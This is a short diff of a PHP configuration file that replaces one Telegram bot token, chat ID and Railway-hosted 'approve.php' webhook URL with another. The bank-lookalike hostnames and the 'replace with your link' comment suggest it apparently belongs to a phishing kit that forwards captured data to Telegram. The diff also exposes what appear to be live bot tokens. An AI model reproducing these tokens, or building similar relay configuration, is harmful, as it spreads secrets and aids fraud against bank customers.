@@ -11,7 +11,7 @@ if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
 }
 
 // ⚙️ Configuración principal (solo accesible por inclusión)
-$bot_token_2 = '8843494963:AAHucmgpOt9uLfxNLxQQ8Uv2B5yqs4brJYU';  
-$chat_id_2   = '-5030882726';
-$webhook_url = 'https://bncbncbnc-production.up.railway.app/approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
+$bot_token_2 = '8899896266:AAEy5oXbxLb3kKVZC_G3T4VBkFl3y8Mtgjc';  
+$chat_id_2   = '-5587627937';
+$webhook_url = 'https://bncpromociones.up.railway.app/approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
 ?>
